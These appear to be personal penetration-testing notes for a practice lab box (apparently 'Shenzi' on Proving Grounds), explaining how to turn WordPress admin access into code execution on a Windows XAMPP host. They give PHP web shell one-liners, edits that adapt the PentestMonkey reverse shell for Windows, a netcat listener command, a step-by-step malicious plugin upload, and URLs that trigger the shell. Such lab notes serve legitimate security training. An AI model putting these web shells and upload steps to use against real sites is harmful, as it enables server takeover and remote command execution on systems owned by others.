

after logging in to wordpress admin panel

use the built-in functionality of WordPress to get

if it's a Windows target (XAMPP), use **PHP reverse shel*l*



### Method 1: The Theme Editor (The Fastest Way)

This is the "standard" way to get a shell once you have admin credentials.

1. In the WordPress sidebar, go to **Appearance > Theme Editor**.
    
2. On the right-hand side, look for a template file that isn't vital, like `404.php` or `archive.php`.
    
3. Delete the existing code and paste in a PHP reverse shell.
    
    - **Tip:** Use the [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), but since this is Windows, a simple one-liner or a web shell (like `<?php system($_GET['cmd']); ?>`) is often more stable.
      
      change
      $shell = 'uname -a; w; id; /bin/sh -i';
      
      to 
      
      $shell = 'cmd.exe';
        
        
        and comment out this part
        
        if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); // ... more code ... }
        
        
        or use this simpler version instead of editing pentestmonkey one to work for windows wordpress targets
        
        ```
        <?php // Simple Windows Web Shell if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?>
        ```
        
        
1. Update the file.
    
2. Set up your listener on Kali: `nc -lvnp 4444`.
    
3. Trigger the shell by visiting the page: `http://192.168.106.55/shenzi/wp-content/themes/[theme-name]/404.php`.
    

---

### Method 2: Malicious Plugin Upload

If the Theme Editor is disabled (common in some hardened labs), you can upload a "plugin" that is actually a shell.

1. On your Kali machine, create a file named `shell.php` with your payload.
    
2. Zip it: `zip shell.zip shell.php`.
    
3. In WordPress, go to **Plugins > Add New > Upload Plugin**.
    
4. Upload your `shell.zip` and click **Install Now**.
    
5. You don't even need to "Activate" it. Just browse to: `http://192.168.106.55/shenzi/wp-content/plugins/shell/shell.php`
    

---

### Important for Windows Targets

Standard bash reverse shells won't work on Windows. Since you saw **XAMPP** earlier, you are on a Windows box. I recommend using a simple **Web Shell** first to confirm execution:

PHP

```
<?php echo shell_exec($_GET['cmd']); ?>
```

Once that is uploaded, you can test it: `http://192.168.106.55/.../shell.php?cmd=whoami`

If that works, you can then use it to execute a more robust PowerShell reverse shell to get a full interactive connection.



------


example:
shenzi in Proving Grounds Practice